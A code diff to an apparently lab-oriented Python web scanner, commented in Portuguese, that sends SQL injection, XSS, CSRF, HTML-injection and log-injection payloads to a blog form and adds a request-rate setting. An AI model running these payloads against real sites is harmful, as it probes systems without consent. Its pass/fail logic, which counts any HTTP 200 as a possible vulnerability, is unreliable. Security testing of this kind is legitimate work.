@@ -1,13 +1,19 @@
 import requests
 import sys
 import os
+import time
 
-if len(sys.argv) > 1:
+if len(sys.argv) > 2:
     url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
+    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
 else:
-    print("URL base não foi fornecida.")
+    print("URL base e/ou taxa de envio não foram fornecidas.")
     sys.exit(1)
-    
+
+# Mapeia a taxa de envio para um intervalo de tempo específico
+delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
+delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida
+
 # Construir a URL alvo usando a URL base e o nome da página
 url_alvo = f"{url_base}/index.php?page=add-to-your-blog.php"
 
@@ -22,7 +28,14 @@ campos_formulario = ['blog_entry', 'logged_in_user_name']
 payloads = {
     'SQL Injection': "' OR '1'='1",
     'XSS': "<script>alert('XSS')</script>",
-    # Adicione outros payloads conforme necessário
+    'Cross Site Request Forgery (CSRF)': "<form action='url_da_pagina_vulneravel' method='POST'><input type='hidden' name='campo_vulneravel' value='valor_malicioso' /><input type='submit' /></form>",
+    'JavaScript Validation Bypass': "admin' --; <script>document.forms[0].submit();</script>",
+    'HTML Injection in Blog Input Field': "<h1>Injected HTML Content</h1>",
+    'Application Exception Output': "' UNION SELECT throw_error('Exception Output') --",
+    'Application Log Injection': "username=admin&password=admin123\n[Injected Log Entry]",
+    'Known Vulnerable Output: Name': "' OR '1'='1 --",
+    'Known Vulnerable Output: Comment': "<script>alert('Vulnerable Output in Comment');</script>",
+    'Known Vulnerable Output: Add Blog for Title': "<script>alert('Vulnerable Output in Add Blog for Title');</script>"
 }
 
 # Contadores para os resultados dos testes
@@ -34,7 +47,14 @@ testes_falharam = 0
 for campo in campos_formulario:
     for tipo_vulnerabilidade, payload in payloads.items():
         dados_formulario = {c: 'teste' for c in campos_formulario}  # Todos os campos com 'teste'
-        dados_formulario[campo] = payload  # Campo atual com o payload
+        
+        # Especificar qual campo deve receber o payload, se necessário
+        if "in Blog Input Field" in tipo_vulnerabilidade:
+            campo_especifico = 'blog_entry'  # Assumindo 'blog_entry' como campo de blog
+        else:
+            campo_especifico = campo
+
+        dados_formulario[campo_especifico] = payload  # Campo atual com o payload
 
         total_testes += 1
 
@@ -43,11 +63,13 @@ for campo in campos_formulario:
 
         # Verificar se o teste foi bem-sucedido usando o código de status
         if resposta_teste.status_code == 200:
-            print(f"Teste #{total_testes} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada no campo '{campo}'!")
+            print(f"Teste #{total_testes} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada no campo '{campo_especifico}'!")
             testes_passaram += 1
         else:
             print(f"Teste #{total_testes} FALHOU: Código de status {resposta_teste.status_code}.")
             testes_falharam += 1
+
+        time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio
 
 # Reportar os resultados finais
 print(f"\nTotal de Testes: {total_testes}")
